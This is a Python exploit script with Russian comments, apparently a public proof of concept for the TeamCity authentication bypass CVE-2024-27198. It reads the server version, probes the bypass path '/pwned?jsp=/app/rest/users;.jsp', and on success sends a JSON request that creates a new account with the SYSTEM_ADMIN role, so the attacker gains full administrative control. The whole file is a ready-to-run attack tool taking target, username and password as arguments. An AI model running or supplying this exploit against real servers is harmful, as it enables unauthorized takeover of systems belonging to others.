import requests
import urllib3
import argparse
import re  

# Отключение предупреждений о небезопасном соединении (SSL warnings)
urllib3.disable_warnings()

# Настройка и парсинг аргументов командной строки
def setup_arguments():
    parser = argparse.ArgumentParser(description="Эксплойт уязвимости TeamCity сервера (CVE-2024-27198) by geniuszly")
    parser.add_argument("-t", "--target", required=True, help="Целевой URL TeamCity сервера")
    parser.add_argument("-u", "--username", required=True, help="Имя для нового пользователя")
    parser.add_argument("-p", "--password", required=True, help="Пароль для нового пользователя")
    return parser.parse_args()

# Извлечение версии TeamCity сервера
def get_version(target_url):
    response = requests.get(f"{target_url}/login.html", verify=False)
    version_pattern = r'<span class="vWord">Version</span>(.+?)</span>'  # Паттерн для нахождения версии

    try:
        version_info = re.search(version_pattern, response.text).group(1).strip()
        print("[+] Версия сервера обнаружена:", version_info)
    except AttributeError:
        print("[-] Не удалось обнаружить версию сервера")

# Проверка уязвимости и попытка создания администратора
def attempt_exploit(target_url, user, passwd):
    exploit_path = "/pwned?jsp=/app/rest/users;.jsp"  # Уязвимый endpoint
    full_exploit_url = f"{target_url}{exploit_path}"

    # Проверка наличия уязвимости
    try:
        exploit_response = requests.get(full_exploit_url, verify=False, timeout=10)
        response_code = exploit_response.status_code
    except requests.RequestException as error:
        print("[-] Ошибка при попытке соединения с сервером:", error)
        return

    if response_code == 200:
        print("[+] Сервер уязвим! Возвращен HTTP код:", response_code)

        # Формируем тело запроса для создания пользователя
        new_user_payload = {
            "username": user,
            "password": passwd,
            "email": f"{user}@mydomain.com",
            "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
        }
        headers = {"Content-Type": "application/json"}

        # Попытка создания пользователя
        try:
            create_response = requests.post(full_exploit_url, json=new_user_payload, headers=headers, verify=False)

            if create_response.status_code == 200:
                print(f"[+] Пользователь '{user}' создан успешно! Перейдите на {target_url}/login.html для входа.")
            else:
                print("[-] Не удалось создать пользователя. Ответ сервера:", create_response.status_code)

        except requests.RequestException as error:
            print("[-] Ошибка при создании пользователя:", error)

    else:
        print("[-] Сервер, вероятно, неуязвим. Возвращен HTTP код:", response_code)

if __name__ == "__main__":
    args = setup_arguments()
    # Проверка версии TeamCity сервера
    get_version(args.target)
    # Попытка выполнения эксплойта
    attempt_exploit(args.target, args.username, args.password)
